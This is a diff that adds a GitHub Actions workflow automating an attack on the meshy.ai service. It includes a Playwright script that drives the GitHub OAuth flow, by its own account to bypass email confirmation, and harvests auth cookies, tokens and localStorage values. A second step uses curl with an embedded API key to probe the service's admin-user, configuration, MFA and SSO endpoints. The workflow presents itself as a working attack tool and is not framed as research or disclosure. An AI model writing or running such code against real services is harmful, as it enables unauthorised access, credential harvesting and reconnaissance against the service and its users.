@@ -1,0 +1,175 @@
+name: Meshy OAuth Bypass
+on:
+  workflow_dispatch:
+
+jobs:
+  meshy_oauth:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - name: Setup Node
+        uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+
+      - name: Install Playwright + Browser
+        run: |
+          npm install -g playwright
+          npx playwright install chromium --with-deps
+        timeout-minutes: 15
+
+      - name: Meshy OAuth Bypass
+        id: oauth
+        run: |
+          set -e
+          echo "=== MESHY OAUTH BYPASS ==="
+          echo "Using GitHub OAuth to bypass email confirmation"
+
+          # Create Node.js script for OAuth flow
+          cat > /tmp/oauth_bypass.mjs << 'SCRIPT'
+import { chromium } from 'playwright';
+
+const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA";
+const GITHUB_CLIENT_ID = "Ov23lizZ7qhYafAtFjNb";
+const GITHUB_REDIRECT = "https://auth.meshy.ai/auth/v1/callback";
+const REDIRECT_TO = "https://www.meshy.ai";
+
+async function run() {
+  const browser = await chromium.launch({ headless: true });
+  const context = await browser.newContext();
+  const page = await context.newPage();
+
+  // Track all requests/responses
+  const authRequests = [];
+  const authResponses = [];
+
+  page.on('request', req => {
+    const url = req.url();
+    if (url.includes('auth.meshy') || url.includes('github') || url.includes('callback')) {
+      authRequests.push({ method: req.method(), url, headers: req.headers() });
+    }
+  });
+
+  page.on('response', async res => {
+    const url = res.url();
+    if (url.includes('auth.meshy') || url.includes('github')) {
+      try {
+        const body = await res.text().catch(() => '');
+        authResponses.push({ status: res.status(), url, body: body.substring(0, 500) });
+      } catch(e) {}
+    }
+  });
+
+  // Step 1: Navigate to Meshy and click GitHub OAuth
+  console.log("[1] Navigating to Meshy signup...");
+  await page.goto('https://www.meshy.ai', { waitUntil: 'networkidle', timeout: 30000 });
+
+  // Try to find and click GitHub OAuth button
+  const githubBtn = page.locator('button[aria-label*="GitHub"], button:has-text("GitHub"), [class*="github"]').first();
+  const gitBtnAlt = page.locator('a[href*="github"], button').filter({ hasText: /github/i }).first();
+
+  console.log("[2] Looking for GitHub OAuth button...");
+  const url = page.url();
+  console.log("Current URL:", url);
+
+  // Try direct GitHub OAuth URL
+  const state = Math.random().toString(36).substring(2, 38);
+  const githubOAuthUrl = `https://auth.meshy.ai/auth/v1/authorize?provider=github&redirect_to=${encodeURIComponent(REDIRECT_TO)}&state=${state}`;
+
+  console.log("[3] Navigating to GitHub OAuth...");
+  await page.goto(githubOAuthUrl, { waitUntil: 'networkidle', timeout: 30000 });
+
+  console.log("After OAuth redirect URL:", page.url());
+  const finalUrl = page.url();
+
+  // If we're back at meshy.ai, we got a token in the URL
+  if (finalUrl.includes('meshy.ai') || finalUrl.includes('auth.meshy')) {
+    console.log("URL after auth:", finalUrl);
+  }
+
+  // Print all captured requests/responses
+  console.log("\n=== CAPTURED AUTH REQUESTS ===");
+  for (const req of authRequests.slice(0, 20)) {
+    console.log(`${req.method} ${req.url}`);
+  }
+
+  console.log("\n=== CAPTURED AUTH RESPONSES ===");
+  for (const res of authResponses.slice(0, 20)) {
+    console.log(`${res.status} ${res.url}`);
+    if (res.body) console.log(res.body.substring(0, 300));
+  }
+
+  // Try to extract tokens from URL or cookies
+  const cookies = await context.cookies();
+  console.log("\n=== COOKIES ===");
+  for (const c of cookies) {
+    if (c.name.includes('auth') || c.name.includes('token') || c.name.includes('session')) {
+      console.log(`${c.name}: ${c.value.substring(0, 50)}...`);
+    }
+  }
+
+  // Try localStorage/sessionStorage
+  const storage = await page.evaluate(() => ({
+    local: JSON.stringify(window.localStorage),
+    session: JSON.stringify(window.sessionStorage)
+  }));
+  console.log("\n=== STORAGE ===");
+  if (storage.local) {
+    const keys = Object.keys(JSON.parse(storage.local || '{}'));
+    for (const k of keys) {
+      if (k.toLowerCase().includes('token') || k.toLowerCase().includes('auth') || k.toLowerCase().includes('user')) {
+        console.log(`localStorage.${k}:`, JSON.parse(storage.local || '{}')[k]);
+      }
+    }
+  }
+
+  await browser.close();
+  console.log("\nDone.");
+}
+
+run().catch(e => { console.error(e); process.exit(1); });
+SCRIPT
+
+          node /tmp/oauth_bypass.mjs
+
+          echo ""
+          echo "=== STEP 2: Parse GitHub OAuth token ==="
+          # If we can capture the OAuth token, use it to get Meshy session
+
+        timeout-minutes: 15
+
+      - name: Deep Internal RE
+        if: always()
+        run: |
+          echo "=== DEEP INTERNAL ANALYSIS ==="
+
+          # Check Supabase internal endpoints
+          echo "1. Check admin endpoints..."
+          curl -s "https://auth.meshy.ai/auth/v1/admin/users" \
+            -H "apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA" \
+            -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA" \
+            2>&1 | head -20
+
+          echo ""
+          echo "2. Check GoTrue config..."
+          curl -s "https://auth.meshy.ai/auth/v1/configuration" \
+            -H "apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA" \
+            2>&1 | head -50
+
+          echo ""
+          echo "3. Check project info..."
+          curl -s "https://auth.meshy.ai/auth/v1/project" \
+            -H "apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA" \
+            2>&1 | head -50
+
+          echo ""
+          echo "4. Check factors (MFA)..."
+          curl -s "https://auth.meshy.ai/auth/v1/factors" \
+            -H "apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA" \
+            2>&1 | head -20
+
+          echo ""
+          echo "5. Check SSO config..."
+          curl -s "https://auth.meshy.ai/auth/v1/sso" \
+            -H "apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA" \
+            2>&1 | head -20
